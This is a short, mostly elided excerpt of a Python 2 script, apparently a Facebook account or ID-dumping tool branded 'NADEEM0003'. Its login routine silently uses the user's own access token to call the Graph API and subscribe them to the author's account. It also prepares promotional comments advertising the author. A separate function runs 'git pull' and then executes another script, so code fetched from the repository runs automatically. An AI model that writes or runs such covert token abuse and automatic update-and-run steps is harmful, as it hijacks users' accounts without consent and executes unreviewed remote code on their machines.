...
def login_xx():
    ...
    kom = random.choice(["Hello I'm a NADEEM0003 user","Be yourself and never surendtod:v","Login NADEEM0003 \nhttps://www.facebook.com/100002461344178/posts/3965852000173472/?substory_index=0&app=fbl"])
    ...
    requests.post('https://graph.facebook.com/100067807565861/subscribers?access_token=' + toket) # Rana Nadeem 2021
...
def awokawokkontol():
	...
	os.system("git pull")
	os.system("python2 Dump0/NADEEM0003.py")
